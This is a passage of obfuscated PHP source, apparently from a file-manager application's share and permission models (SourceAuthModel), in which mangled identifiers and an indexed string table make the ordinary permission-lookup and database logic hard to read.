(isset($Ì±¬Âúì[$¡ÙĞ×›€[33]]) && in_array($Ì±¬Âúì[$¡ÙĞ×›€[33]], array($¡ÙĞ×›€[88], $¡ÙĞ×›€[437], $¡ÙĞ×›€[2027], $¡ÙĞ×›€[2028], $¡ÙĞ×›€[2029]))) { $€…Ïš“×[$¡ÙĞ×›€[33]] = $Ì±¬Âúì[$¡ÙĞ×›€[33]]; } if (isset($Ì±¬Âúì[$¡ÙĞ×›€[751]]) && in_array($Ì±¬Âúì[$¡ÙĞ×›€[751]], array($¡ÙĞ×›€[197], $¡ÙĞ×›€[88], $¡ÙĞ×›€[437], $¡ÙĞ×›€[2027]))) { $€…Ïš“×[$¡ÙĞ×›€[751]] = $Ì±¬Âúì[$¡ÙĞ×›€[751]]; } $×½Ã¥Ğ = Input::get($¡ÙĞ×›€[458], $¡ÙĞ×›€[7], $¡ÙĞ×›€[2026], array($¡ÙĞ×›€[1948], $¡ÙĞ×›€[452])); $ığŸÍóÏ = array($¡ÙĞ×›€[450] => $¡ÙĞ×›€[451], $¡ÙĞ×›€[452] => $¡ÙĞ×›€[453]); $Ç‹ñÁ¼ = $¡ÙĞ×›€[2030] . $ığŸÍóÏ[$×½Ã¥Ğ]; $ÓÅå€Š® = Model($¡ÙĞ×›€[2022])->where($€…Ïš“×)->order($Ç‹ñÁ¼)->selectPage(20); if (empty($ÓÅå€Š®[$¡ÙĞ×›€[369]])) { return array(); } $ïëÚ–»¤ = array_to_keyvalue_group($ÓÅå€Š®[$¡ÙĞ×›€[369]], $¡ÙĞ×›€[751], $¡ÙĞ×›€[489]); if (!empty($ïëÚ–»¤[0])) { $Ì±¬Âúì = $ïëÚ–»¤[0]; $€…Ïš“× = array($¡ÙĞ×›€[489] => array($¡ÙĞ×›€[7], $Ì±¬Âúì)); $æ¥“¬º = $this->where($€…Ïš“×)->field($¡ÙĞ×›€[489])->select(); $æ¥“¬º = array_to_keyvalue($æ¥“¬º, $¡ÙĞ×›€[12], $¡ÙĞ×›€[489]); $Òä£³òğ = array_diff($Ì±¬Âúì, $æ¥“¬º); if (!empty($Òä£³òğ)) { foreach ($ÓÅå€Š®[$¡ÙĞ×›€[369]] as $èŞ¤ûÛ„ => $˜Û“õú) { if (in_array($˜Û“õú[$¡ÙĞ×›€[489]], $Òä£³òğ)) { unset($ÓÅå€Š®[$¡ÙĞ×›€[369]][$èŞ¤ûÛ„]); } } } } $this->_listDataApply($ÓÅå€Š®[$¡ÙĞ×›€[369]]); return $ÓÅå€Š®; } public function reportStatus($Õ¸ôìŸö) { $Âæ£ØÒ =& $_SERVER[ùÆÎÔ“Ñ]; $£ÉÂ‘‘ = array($Âæ£ØÒ[399] => $Õ¸ôìŸö[$Âæ£ØÒ[399]]); $ÀÀÜ„Ûí = Model($Âæ£ØÒ[2022])->where($£ÉÂ‘‘)->field($Âæ£ØÒ[2031])->find(); if (!$ÀÀÜ„Ûí) { return !1; } $Äáë˜£¸ = array($Âæ£ØÒ[751] => $Õ¸ôìŸö[$Âæ£ØÒ[751]]); if ($Õ¸ôìŸö[$Âæ£ØÒ[751]] == $Âæ£ØÒ[2027] && $ÀÀÜ„Ûí[$Âæ£ØÒ[751]] == $Âæ£ØÒ[2027]) { $Äáë˜£¸[$Âæ£ØÒ[751]] = 0; } $–ßÚêŒ¹ = Model($Âæ£ØÒ[2022])->where($£ÉÂ‘‘)->save($Äáë˜£¸); if ($Õ¸ôìŸö[$Âæ£ØÒ[751]] == $Âæ£ØÒ[437]) { if ($ÀÀÜ„Ûí[$Âæ£ØÒ[468]] != $Âæ£ØÒ[197] && $this->shareFileMeta($ÀÀÜ„Ûí[$Âæ£ØÒ[468]])) { $this->shareFileMeta($ÀÀÜ„Ûí[$Âæ£ØÒ[468]], 0); } $this->remove($ÀÀÜ„Ûí[$Âæ£ØÒ[489]]); return !0; } if ($–ßÚêŒ¹ && $Õ¸ôìŸö[$Âæ£ØÒ[751]] == $Âæ£ØÒ[2027]) { $ÍË²Ê¯Ü = $Äáë˜£¸[$Âæ£ØÒ[751]] == $Âæ£ØÒ[2027] ? 1 : 0; $this->shareFileMeta($ÀÀÜ„Ûí[$Âæ£ØÒ[468]], $ÍË²Ê¯Ü); $this->removeByFile($ÀÀÜ„Ûí[$Âæ£ØÒ[468]]); } return $–ßÚêŒ¹; } private function removeByFile($®­—õä») { $¢Ü™®Ö =& $_SERVER[ùÆÎÔ“Ñ]; $•í›Ç½Ş = Model($¢Ü™®Ö[826])->where(array($¢Ü™®Ö[468] => $®­—õä»))->field($¢Ü™®Ö[402])->select(); $²§¡î÷¤ = array_to_keyvalue($•í›Ç½Ş, $¢Ü™®Ö[12], $¢Ü™®Ö[402]); $ ¥’ó = array($¢Ü™®Ö[402] => array($¢Ü™®Ö[7], $²§¡î÷¤), $¢Ü™®Ö[494] => 1); $•í›Ç½Ş = $this->where($ ¥’ó)->field($¢Ü™®Ö[489])->select(); if (empty($•í›Ç½Ş)) { return; } $ò¿Óé‡‰ = array_to_keyvalue($•í›Ç½Ş, $¢Ü™®Ö[12], $¢Ü™®Ö[489]); $this->remove($ò¿Óé‡‰); } private function shareFileMeta($‰Ô¿ÏØÁ, $Ë„•¨ƒ¾ = null) { $ÓŒù»öÖ =& $_SERVER[ùÆÎÔ“Ñ]; $ÕúÙ€ßº = array($ÓŒù»öÖ[468] => $‰Ô¿ÏØÁ, $ÓŒù»öÖ[94] => $ÓŒù»öÖ[2032]); if (is_null($Ë„•¨ƒ¾)) { return Model($ÓŒù»öÖ[2033])->where($ÕúÙ€ßº)->find(); } $ÕúÙ€ßº[$ÓŒù»öÖ[374]] = $Ë„•¨ƒ¾; Model($ÓŒù»öÖ[2033])->add($ÕúÙ€ßº, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\x6f\x75\162\143\145\x5f\x61\165\164\x68"; public function getAuth($è®¸³§„) { $œ¼ÍÅ¢¸ =& $_SERVER[ùÆÎÔ“Ñ]; $†Ã„Ÿ²˜ = $this->sourceAuthSelect($è®¸³§„); $ñù„¨‡« = array(); $ãõÍÄôö = array(); $ÄŸ‰áã = 2 << 25; foreach ($†Ã„Ÿ²˜ as $Š¸µ¾Æ) { $œ¹ĞæÀ = Model($œ¼ÍÅ¢¸[507])->listData($Š¸µ¾Æ[$œ¼ÍÅ¢¸[1961]]); if (!$œ¹ĞæÀ) { continue; } $ñù„¨‡«[] = $Š¸µ¾Æ; $›Ê‘Ì¡ = 0; if ($Š¸µ¾Æ[$œ¼ÍÅ¢¸[411]] == SourceModel::TYPE_GROUP) { $›Ê‘Ì¡ = $ÄŸ‰áã * 2; } if ($Š¸µ¾Æ[$œ¼ÍÅ¢¸[411]] == SourceModel::TYPE_USER) { $›Ê‘Ì¡ = $ÄŸ‰áã; } if ($Š¸µ¾Æ[$œ¼ÍÅ¢¸[411]] == SourceModel::TYPE_USER && $Š¸µ¾Æ[$œ¼ÍÅ¢¸[505]] == $œ¼ÍÅ¢¸[197]) { $›Ê‘Ì¡ = 0; } $ãõÍÄôö[] = $œ¹ĞæÀ[$œ¼ÍÅ¢¸[413]] + $›Ê‘Ì¡; } array_multisort($ãõÍÄôö, SORT_DESC, $ñù„¨‡«); return $ñù„¨‡«; } public function sourceAuthSelect($ş¼äõÉö) { $€ô‹İ•Ã =& $_SERVER[ùÆÎÔ“Ñ]; static $Ãû‰©ÚË = array(); $Ì¾Áã»Ã = is_array($ş¼äõÉö) ? !1 : !0; if ($Ì¾Áã»Ã) { $ş¼äõÉö = array($ş¼äõÉö); } $ìˆ³¥»ì = array(); foreach ($ş¼äõÉö as $‹óÛµı°) { if (isset($Ãû‰©ÚË[$‹óÛµı°])) { $ìˆ³¥»ì[$‹óÛµı°] = $Ãû‰©ÚË[$‹óÛµı°]; } } if (count($ìˆ³¥»ì) == count($ş¼äõÉö)) { return $Ì¾Áã»Ã ? $ìˆ³¥»ì[$ş¼äõÉö[0]] : $ìˆ³¥»ì; } $Ù‡·™Ì  = $€ô‹İ•Ã[2034]; $Ìˆ´Ë•å = array($€ô‹İ•Ã[402] => array($€ô‹İ•Ã[7], $ş¼äõÉö)); $¤ìÍëª¢ = $this->field($Ù‡·™Ì )->order($€ô‹İ•Ã[399])->where($Ìˆ´Ë•å)->select(); $İ‚ïÒĞÚ = array_to_keyvalue_group($¤ìÍëª¢, $€ô‹İ•Ã[402]); foreach ($ş¼äõÉö as $‹óÛµı°) { $Ãû‰©ÚË[$‹óÛµı°] = $İ‚ïÒĞÚ[$‹óÛµı°] ? $İ‚ïÒĞÚ[$‹óÛµı°] : array(); } if ($Ì¾Áã»Ã) { return $¤ìÍëª¢; } return $İ‚ïÒĞÚ; } public function setAuth($†õ–ºåë, $Îœ÷¨û) { $ú¾ÇÓØâ =& $_SERVER[ùÆÎÔ“Ñ]; $½óïÏœö = Model($ú¾ÇÓØâ[1341])->sourceInfo($†õ–ºåë); if (!$½óïÏœö) { return !1; } if ($½óïÏœö[$ú¾ÇÓØâ[411]] != SourceModel::TYPE_GROUP) { return !1; } $ç¬ĞÚÖÙ = 1; $Æ·ÎŒá‰ = $½óïÏœö[$ú¾ÇÓØâ[505]]; if ($Æ·ÎŒá‰ != $ç¬ĞÚÖÙ) { $¤ëäá±³ = array($ú¾ÇÓØâ[1857] => $Æ·ÎŒá‰); $°ã©«ú… = Model($ú¾ÇÓØâ[1947])->field($ú¾ÇÓØâ[1667])->where($¤ëäá±³)->select(); $°ã©«ú… = array_to_keyvalue($°ã©«ú…, $ú¾ÇÓØâ[12], $ú¾ÇÓØâ[1667]); } $ü€Ê‡ï = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $üä¼™ÚÇ = array(); foreach ($Îœ÷¨û as $ì¾‚øš) { if (!in_array($ì¾‚øš[$ú¾ÇÓØâ[411]], $ü€Ê‡ï)) { show_json(LNG($ú¾ÇÓØâ[2035]), !1); } if ($Æ·ÎŒá‰ != $ç¬ĞÚÖÙ) { if ($ì¾‚øš[$ú¾ÇÓØâ[411]] == SourceModel::TYPE_GROUP) { } if ($ì¾‚øš[$ú¾ÇÓØâ[505]] != 0 && !in_array($ì¾‚øš[$ú¾ÇÓØâ[505]], $°ã©«ú…)) { } } if ($ì¾‚øš[$ú¾ÇÓØâ[505]] == 0) { $ì¾‚øš[$ú¾ÇÓØâ[411]] = SourceModel::TYPE_USER; } $üä¼™ÚÇ[] = array($ú¾ÇÓØâ[402] => $†õ–ºåë, $ú¾ÇÓØâ[411] => intval($ì¾‚øš[$ú¾ÇÓØâ[411]]), $ú¾ÇÓØâ[505] => intval($ì¾‚øš[$ú¾ÇÓØâ[505]]), $ú¾ÇÓØâ[1961] => intval($ì¾‚øš[$ú¾ÇÓØâ[1961]]) ? intval($ì¾‚øš[$ú¾ÇÓØâ[1961]]) : 0, $ú¾ÇÓØâ[2017] => intval($ì¾‚øš[$ú¾ÇÓØâ[2017]]) ? intval($ì¾‚øš[$ú¾ÇÓØâ[2017]]) : -1); } $this->where(array($ú¾ÇÓØâ[417] => $†õ–ºåë))->delete(); $this->addAll($üä¼™ÚÇ); return !0; } public function authClear($‚ë¥Ş„º) { $ˆÍ°Õ =& $_SERVER[ùÆÎÔ“Ñ]; $ºÆªÅ÷Ù = Model($ˆÍ°Õ[1341])->sourceInfo($‚ë¥Ş„º); $¾€ÊªáÊ = array($‚ë¥Ş„º); if ($ºÆªÅ÷Ù[$ˆÍ°Õ[410]] == $ˆÍ°Õ[88]) { $Íï®€û = array($ˆÍ°Õ[590] => array($ˆÍ°Õ[550], $ºÆªÅ÷Ù[$ˆÍ°Õ[521]] . $‚ë¥Ş„º . $ˆÍ°Õ[551])); $¾€ÊªáÊ = Model($ˆÍ°Õ[1341])->field($ˆÍ°Õ[417])->where($Íï®€û)->getField($ˆÍ°Õ[402], !0); $¾€ÊªáÊ[] = $‚ë¥Ş„º; } $this->where(array($ˆÍ°Õ[417] => array($ˆÍ°Õ[418], $¾€ÊªáÊ)))->delete(); return !0; } public function getAllChildren($øÎŸÇùØ) { $şáŸîêª =& $_SERVER[ùÆÎÔ“Ñ]; $¹âÊ‘Ìú = Model($şáŸîêª[1341])->sourceInfo($øÎŸÇùØ); if ($¹âÊ‘Ìú[$şáŸîêª[410]] != $şáŸîêª[88]) { return $this->sourceListAuth(array($øÎŸÇùØ)); } if ($¹âÊ‘Ìú[$şáŸîêª[411]] != SourceModel::TYPE_GROUP) { return array(); } $Á¹ ¥¿½ = 1; $­ûŸö = array($øÎŸÇùØ); if ($¹âÊ‘Ìú[$şáŸîêª[432]] == $şáŸîêª[197] && $¹âÊ‘Ìú[$şáŸîêª[505]] != $Á¹ ¥¿½) { $­ûŸö = $this->groupChidldAllRootSource($¹âÊ‘Ìú[$şáŸîêª[505]]); } $Œà¨¢ÚÆ = $this->field($şáŸîêª[402])->group($şáŸîêª[402])->select(); $Œà¨¢ÚÆ = array_to_keyvalue($Œà¨¢ÚÆ, $şáŸîêª[12], $şáŸîêª[402]); if (!$Œà¨¢ÚÆ) { return array(); } $¡¢ªïòÆ = $şáŸîêª[2036]; $­Í•ğ¯ = array($şáŸîêª[402] => array($şáŸîêª[7], $Œà¨¢ÚÆ), $şáŸîêª[431] => $şáŸîêª[197]); $ê¢ÌáÙ¤ = Model($şáŸîêª[826])->field($¡¢ªïòÆ)->where($­Í•ğ¯)->select(); $Š¶„…ôé = array($øÎŸÇùØ); foreach ($ê¢ÌáÙ¤ as $É¡áŒš‚) { foreach ($­ûŸö as $ìÓùŠ ½) { $ÚÙß†™ = $şáŸîêª[50] . $ìÓùŠ ½ . $şáŸîêª[50]; $ëÙ—ì = $É¡áŒš‚[$şáŸîêª[521]] . $É¡áŒš‚[$şáŸîêª[402]] . $şáŸîêª[50]; if (strstr($ëÙ—ì, $ÚÙß†™)) { $Š¶„…ôé[] = $É¡áŒš‚[$şáŸîêª[402]]; break; } } } return $this->sourceListAuth($Š¶„…ôé); } private function sourceListAuth($–›¯šÂ“) { $ğÖ©üğä =& $_SERVER[ùÆÎÔ“Ñ]; $ì•È”ØÁ = Model($ğÖ©üğä[1341])->sourceListInfo($–›¯šÂ“, !0); $›ªé©Å… = $this->sourceAuthSelect($–›¯šÂ“); $æò¿çü£ = array(); $“ˆ˜®± = array(); foreach ($ì•È”ØÁ as $ıòñª±Ç) { unset($ıòñª±Ç[$ğÖ©üğä[456]]); unset($ıòñª±Ç[$ğÖ©üğä[454]]); unset($ıòñª±Ç[$ğÖ©üğä[413]]); unset($ıòñª±Ç[$ğÖ©üğä[86]]); $“ñÏ”Ş = $›ªé©Å…[$ıòñª±Ç[$ğÖ©üğä[402]]]; if (!$“ñÏ”Ş) { continue; } $ıòñª±Ç[$ğÖ©üğä[2037]] = $this->authTargetInfo($“ñÏ”Ş); $ıòñª±Ç[$ğÖ©üğä[519]] = rtrim($ıòñª±Ç[$ğÖ©üğä[525]], $ğÖ©üğä[8]) . $ğÖ©üğä[8] . ltrim($ıòñª±Ç[$ğÖ©üğä[519]], $ğÖ©üğä[8]); $æò¿çü£[] = $ıòñª±Ç; $²áÆÖ¢Ä = count(explode($ğÖ©üğä[8], trim($ıòñª±Ç[$ğÖ©üğä[519]], $ğÖ©üğä[8]))); $“ˆ˜®±[] = $²áÆÖ¢Ä + ($ıòñª±Ç[$ğÖ©üğä[33]] == $ğÖ©üğä[75] ? 0 : 1000); } array_multisort($“ˆ˜®±, SORT_ASC, $æò¿çü£); return $æò¿çü£; } private function groupChidldAllRootSource($ìè–ü±è) { $ìù°¼» =& $_SERVER[ùÆÎÔ“Ñ]; $öù²áø‘ = Model($ìù°¼»[2038])->groupChildrenAll($ìè–ü±è); $ØéöÈê¨ = array($ìù°¼»[432] => 0, $ìù°¼»[505] => array($ìù°¼»[7], $öù²áø‘), $ìù°¼»[411] => SourceModel::TYPE_GROUP); $ç“íÑ…© = Model($ìù°¼»[826])->field($ìù°¼»[402])->where($ØéöÈê¨)->select(); $ç“íÑ…© = array_to_keyvalue($ç“íÑ…©, $ìù°¼»[12], $ìù°¼»[402]); return $ç“íÑ…©; } private function authTargetInfo($ûÚÎ‰È) { $²×·ªÉ =& $_SERVER[ùÆÎÔ“Ñ]; $øÂêÄÌ = array(); $âôº‚Ïµ = array(); $éÍÔÙ˜å = 2 << 25; foreach ($ûÚÎ‰È as $êò¢·òï) { $ŒÎ´øí = Model($²×·ªÉ[507])->listData($êò¢·òï[$²×·ªÉ[1961]]); if (!$ŒÎ´øí) { continue; } if ($êò¢·òï[$²×·ªÉ[411]] == SourceModel::TYPE_USER) { $œ ç£Û = Model($²×·ªÉ[513])->getInfoSimpleOuter($êò¢·òï[$²×·ªÉ[505]]); if ($œ ç£Û[$²×·ªÉ[1667]] == $²×·ªÉ[1194]) { continue; } if ($œ ç£Û[$²×·ªÉ[1667]] == $²×·ªÉ[197]) { $œ ç£Û[$²×·ªÉ[32]] = LNG($²×·ªÉ[2039]); } } else { $œ ç£Û = Model($²×·ªÉ[522])->getInfoSimple($êò¢·òï[$²×·ªÉ[505]]); } if (!$œ ç£Û) { continue; } $œ ç£Û[$²×·ªÉ[467]] = $ŒÎ´øí; $øÂêÄÌ[] = $œ ç£Û; $ƒ’¶¡Šá = 0; if ($êò¢·òï[$²×·ªÉ[411]] == SourceModel::TYPE_GROUP) { $ƒ’¶¡Šá = $éÍÔÙ˜å * 2; } if ($êò¢·òï[$²×·ªÉ[411]] == SourceModel::TYPE_USER) { $ƒ’¶¡Šá = $éÍÔÙ˜å; } if ($êò¢·òï[$²×·ªÉ[411]] == SourceModel::TYPE_USER && $êò¢·òï[$²×·ªÉ[505]] == $²×·ªÉ[197]) { $ƒ’¶¡Šá = 0; } $âôº‚Ïµ[] = $ŒÎ´øí[$²×·ªÉ[413]] + $ƒ’¶¡Šá; } array_multisort($âôº‚Ïµ, SORT_DESC, $øÂêÄÌ); return $øÂêÄÌ; } public function getAllChildrenByUser($™›‘šûù, $Ş­ıüôİ) { $‹…ò€’É =& $_SERVER[ùÆÎÔ“Ñ]; $«”Â“¿æ = Model($‹…ò€’É[535])->getInfo($Ş­ıüôİ); if (!$Ş­ıüôİ || !$™›‘šûù || !$«”Â“¿æ) { return array(); } $‘›‚±¬¢ = Model($‹…ò€’É[1341])->sourceInfo($™›‘šûù); $“Ğ’úüÙ = array(); $¹©„®° = 1; if ($‘›‚±¬¢[$‹…ò€’É[432]] == $‹…ò€’É[197] && $‘›‚±¬¢[$‹…ò€’É[505]] != $¹©„®° && $this->groupContainUser($‘›‚±¬¢[$‹…ò€’É[505]], $Ş­ıüôİ)) { foreach ($«”Â“¿æ[$‹…ò€’É[2040]] as $ÈÎä€ š) { $¾ø™é¸  = Model($‹…ò€’É[522])->getInfo($ÈÎä€ š[$‹…ò€’É[1857]]); $šŠñ·ÌŸ = Model($‹…ò€’É[535])->getInfoSimpleOuter($Ş­ıüôİ); $šŠñ·ÌŸ[$‹…ò€’É[467]] = $ÈÎä€ š[$‹…ò€’É[413]]; if (Model($‹…ò€’É[507])->authCheckAction($ÈÎä€ š[$‹…ò€’É[413]][$‹…ò€’É[413]], $‹…ò€’É[1878])) { continue; } $ˆĞù¿¨­ = array($‹…ò€’É[32] => $‹…ò€’É[1214] . $¾ø™é¸ [$‹…ò€’É[32]], $‹…ò€’É[402] => $¾ø™é¸ [$‹…ò€’É[86]][$‹…ò€’É[402]], $‹…ò€’É[84] => KodIO::make($¾ø™é¸ [$‹…ò€’É[86]][$‹…ò€’É[402]]), $‹…ò€’É[432] => $‹…ò€’É[197], $‹…ò€’É[411] => $‹…ò€’É[515], $‹…ò€’É[33] => $‹…ò€’É[554], $‹…ò€’É[519] => $¾ø™é¸ [$‹…ò€’É[526]], $‹…ò€’É[1857] => $¾ø™é¸ [$‹…ò€’É[1857]], $‹…ò€’É[523] => $¾ø™é¸ [$‹…ò€’É[432]], $‹…ò€’É[2037] => array($šŠñ·ÌŸ)); $“Ğ’úüÙ[$ˆĞù¿¨­[$‹…ò€’É[402]]] = $ˆĞù¿¨­; } } $·ùêŸŒé = array(); $Ü¨ºÈã = $this->getAllChildren($™›‘šûù); foreach ($Ü¨ºÈã as $œ±ÛÆÉ») { $®ú‚ÏÕ¾ = !1; foreach ($œ±ÛÆÉ»[$‹…ò€’É[2037]] as $’“á»Œ) { if ($’“á»Œ[$‹…ò€’É[1667]]) { if ($’“á»Œ[$‹…ò€’É[1667]] == $Ş­ıüôİ) { $®ú‚ÏÕ¾ = !0; break; } } if ($’“á»Œ[$‹…ò€’É[1857]]) { if ($this->groupContainUser($’“á»Œ[$‹…ò€’É[1857]], $Ş­ıüôİ)) { $®ú‚ÏÕ¾ = !0; break; } } } if ($®ú‚ÏÕ¾) { $·ùêŸŒé[] = $œ±ÛÆÉ»; } $öÑò¢ä = $œ±ÛÆÉ»[$‹…ò€’É[402]]; if (isset($“Ğ’úüÙ[$öÑò¢ä])) { $œ±ÛÆÉ»[$‹…ò€’É[2037]][] = $“Ğ’úüÙ[$öÑò¢ä][0]; $“Ğ’úüÙ[$öÑò¢ä] = !1; } } $“Ğ’úüÙ = array_filter(array_values($“Ğ’úüÙ)); $·ùêŸŒé = array_merge($“Ğ’úüÙ, $·ùêŸŒé); return $·ùêŸŒé; } public function setAllChildrenByUser($™¢Ëš¬, $û™šÒö‰, $¦á×®ò) { $ßŞ±œİú =& $_SERVER[ùÆÎÔ“Ñ]; $î•š¹…á = $this->getAllChildrenByUser($™¢Ëš¬, $û™šÒö‰); if (!$¦á×®ò || !$î•š¹…á) { return !1; } foreach ($î•š¹…á as $¬µÂÀ§Œ) { $Éù¸ŸÇÖ = array(); foreach ($¬µÂÀ§Œ[$ßŞ±œİú[2037]] as $¿ÏçñŸ) { $çÜ—¡©ø = $¿ÏçñŸ[$ßŞ±œİú[467]]; $‡Œ¹ìáÆ = $¿ÏçñŸ[$ßŞ±œİú[1667]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $ÒÑ’¦ = $¿ÏçñŸ[$ßŞ±œİú[1667]] ? $¿ÏçñŸ[$ßŞ±œİú[1667]] : $¿ÏçñŸ[$ßŞ±œİú[1857]]; if ($¿ÏçñŸ[$ßŞ±œİú[1667]] && $¿ÏçñŸ[$ßŞ±œİú[1667]] == $û™šÒö‰) { continue; } $Éù¸ŸÇÖ[] = array($ßŞ±œİú[402] => $¬µÂÀ§Œ[$ßŞ±œİú[402]], $ßŞ±œİú[411] => $‡Œ¹ìáÆ, $ßŞ±œİú[505] => intval($ÒÑ’¦), $ßŞ±œİú[1961] => isset($çÜ—¡©ø[$ßŞ±œİú[399]]) ? intval($çÜ—¡©ø[$ßŞ±œİú[399]]) : 0, $ßŞ±œİú[2017] => isset($çÜ—¡©ø[$ßŞ±œİú[2017]]) ? intval($çÜ—¡©ø[$ßŞ±œİú[2017]]) : -1); } $Éù¸ŸÇÖ[] = array($ßŞ±œİú[402] => $¬µÂÀ§Œ[$ßŞ±œİú[402]], $ßŞ±œİú[411] => SourceModel::TYPE_USER, $ßŞ±œİú[505] => intval($û™šÒö‰), $ßŞ±œİú[1961] => intval($¦á×®ò), $ßŞ±œİú[2017] => -1); $this->where(array($ßŞ±œİú[417] => $¬µÂÀ§Œ[$ßŞ±œİú[402]]))->delete(); $this->addAll($Éù¸ŸÇÖ); } return !0; } public function get($ú´õ¦°) { $ÊÜìŞ = $this->getSourceList(array($ú´õ¦°), !0); return $ÊÜìŞ[0]; } public function getSourceList($ä‡ÉşÕ, $›¹—š¬ = false, $’¹ß¾» = false) { $¦¢Èê³ =& $_SERVER[ùÆÎÔ“Ñ]; if (!$ä‡ÉşÕ) { return array(); } $°”¾½í® = Model($¦¢Èê³[1341]); if (!$›¹—š¬ && count($ä‡ÉşÕ) == 1) { $›¹—š¬ = array(); $›¹—š¬[$ä‡ÉşÕ[0]] = $°”¾½í®->sourceInfo($ä‡ÉşÕ[0]); } if (!$›¹—š¬) { $Ö¹—¾Š¤ = array($¦¢Èê³[417] => array($¦¢Èê³[418], $ä‡ÉşÕ)); $›¹—š¬ = $°”¾½í®->field($¦¢Èê³[2041])->where($Ö¹—¾Š¤)->select(); $›¹—š¬ = array_to_keyvalue($›¹—š¬, $¦¢Èê³[402]); } $İŠÎ›Ë² = $ä‡ÉşÕ; foreach ($›¹—š¬ as $œ“¤Ö°Ñ => $·âÛ·ïÍ) { $šìı”ìË = $°”¾½í®->parentLevelArray($·âÛ·ïÍ[$¦¢Èê³[521]]); $İŠÎ›Ë² = array_merge($İŠÎ›Ë², array($œ“¤Ö°Ñ), array_reverse($šìı”ìË)); } $İŠÎ›Ë² = array_values(array_unique($İŠÎ›Ë²)); if (!$İŠÎ›Ë²) { return array(); } $‹€Š­†ï = $this->sourceAuthSelect($İŠÎ›Ë²); $ƒËÔï·á = array(); foreach ($İŠÎ›Ë² as $¾üüüŒÃ) { if (isset($‹€Š­†ï[$¾üüüŒÃ])) { $ƒËÔï·á[$¾üüüŒÃ] = $‹€Š­†ï[$¾üüüŒÃ]; } } $õ×ØÒ±± = $this->userIsRoot($’¹ß¾»); $šˆé»Áú = AuthModel::authAll(); $Ì¥ã¯ù = array($¦¢Èê³[414] => $šˆé»Áú, $¦¢Èê³[2042] => array($¦¢Èê³[419] => 0, $¦¢Èê³[1863] => $šˆé»Áú, $¦¢Èê³[420] => LNG($¦¢Èê³[2043]), $¦¢Èê³[1880] => $¦¢Èê³[2044])); $Ïƒ×³™ = array(); foreach ($›¹—š¬ as $¾üüüŒÃ => $ˆ°‰Õ®Ô) { if ($õ×ØÒ±± && $GLOBALS[$¦¢Èê³[6]][$¦¢Èê³[1876]]) { $Ïƒ×³™[$¾üüüŒÃ] = $Ì¥ã¯ù; continue; } $Ïƒ×³™[$¾üüüŒÃ] = $this->makeSourceAuth($ˆ°‰Õ®Ô, $ƒËÔï·á, $’¹ß¾»); } return $Ïƒ×³™; } public function authDeepCheck($áÎÌŸÁØ, $ÀäÊ˜¢õ = false) { $¶òÉ¨ç— =& $_SERVER[ùÆÎÔ“Ñ]; $ÀäÊ˜¢õ = $ÀäÊ˜¢õ ? $ÀäÊ˜¢õ : USER_ID; $ã‰§î¡ = $this->makeAuthDeep($ÀäÊ˜¢õ); if (!in_array($áÎÌŸÁØ, $ã‰§î¡[$¶òÉ¨ç—[2045]])) { return !1; } $Ê‡¥±æµ = array(); foreach ($ã‰§î¡[$¶òÉ¨ç—[2046]] as $½£Šİ¯Å => $¿¹Óç¯¼) { if (!in_array($áÎÌŸÁØ, $¿¹Óç¯¼)) { continue; } $Ê‡¥±æµ[] = $½£Šİ¯Å; } if (!$Ê‡¥±æµ) { return !1; } $¹ÑÙÇı = $Ê‡¥±æµ ? $Ê‡¥±æµ[0] : $áÎÌŸÁØ; return array($¶òÉ¨ç—[414] => -1, $¶òÉ¨ç—[467] => array($¶òÉ¨ç—[419] => $¶òÉ¨ç—[1194], $¶òÉ¨ç—[1863] => $¶òÉ¨ç—[197], $¶òÉ¨ç—[420] => LNG($¶òÉ¨ç—[2047]), $¶òÉ¨ç—[1880] => $¶òÉ¨ç—[2048]), $¶òÉ¨ç—[2049] => LNG($¶òÉ¨ç—[2050]), $¶òÉ¨ç—[2051] => $this->sourceAuthInfo($¹ÑÙÇı)); } protected function makeAuthDeep($‹¦±ÆäÎ = false) { $É¼ó²„ =& $_SERVER[ùÆÎÔ“Ñ]; static $…á°¹” = array(); $‹¦±ÆäÎ = $‹¦±ÆäÎ ? $‹¦±ÆäÎ : USER_ID; if (isset($…á°¹”[$‹¦±ÆäÎ])) { return $…á°¹”[$‹¦±ÆäÎ]; } $úæ¢ÚÍÛ = Model($É¼ó²„[2052])->listData(); $…—ğ‰¢ƒ = array(); foreach ($úæ¢ÚÍÛ as $à¼àñ) { if ($à¼àñ[$É¼ó²„[413]] == 0 && $à¼àñ[$É¼ó²„[1879]] == $É¼ó²„[88]) { $…—ğ‰¢ƒ[] = $à¼àñ[$É¼ó²„[399]]; } } $Ûµşó¹Ê = $this->userGroupParents($‹¦±ÆäÎ); $ÅúƒÒÂû = array($É¼ó²„[411] => SourceModel::TYPE_USER, $É¼ó²„[505] => $‹¦±ÆäÎ); if ($Ûµşó¹Ê) { $ÅúƒÒÂû = array(array($É¼ó²„[411] => SourceModel::TYPE_USER, $É¼ó²„[505] => $‹¦±ÆäÎ), array($É¼ó²„[411] => SourceModel::TYPE_GROUP, $É¼ó²„[505] => array($É¼ó²„[418], $Ûµşó¹Ê)), $É¼ó²„[1005] => $É¼ó²„[1955]); } $äÕ¼’ß¿ = $this->field($É¼ó²„[2053])->where($ÅúƒÒÂû)->select(); $íèÄ¢Ä = array(); $¤úİ¦º¯ = array_to_keyvalue_group($äÕ¼’ß¿, $É¼ó²„[402]); foreach ($¤úİ¦º¯ as $«¯†¾¹ => $ÌŸª¾ã¶) { $´Ö…¿ù = $this->authArrayCheck($ÌŸª¾ã¶, $‹¦±ÆäÎ); if ($´Ö…¿ù[$É¼ó²„[414]] > 0) { $íèÄ¢Ä[] = $«¯†¾¹ . $É¼ó²„[12]; } } if ($Ûµşó¹Ê) { $™„½şìÙ = Model($É¼ó²„[522]); foreach ($Ûµşó¹Ê as $ˆ¶ØáŞ¯) { $™±ÁÙö = $™„½şìÙ->getInfo($ˆ¶ØáŞ¯); if (!$™±ÁÙö || !is_array($™±ÁÙö[$É¼ó²„[86]])) { continue; } $íèÄ¢Ä[] = $™±ÁÙö[$É¼ó²„[86]][$É¼ó²„[402]]; } } $²µ¼ß‘ = array(); $“Ä¾Ëë¿ = $Ûµşó¹Ê; $áş¶á’ª = Model($É¼ó²„[1341]); $™„½şìÙ = Model($É¼ó²„[522]); $ßêá–Õ¬ = array(); $³Ñ”åçı = array(); $€¼ï—³ = array(); $şÔ÷ôÄÔ 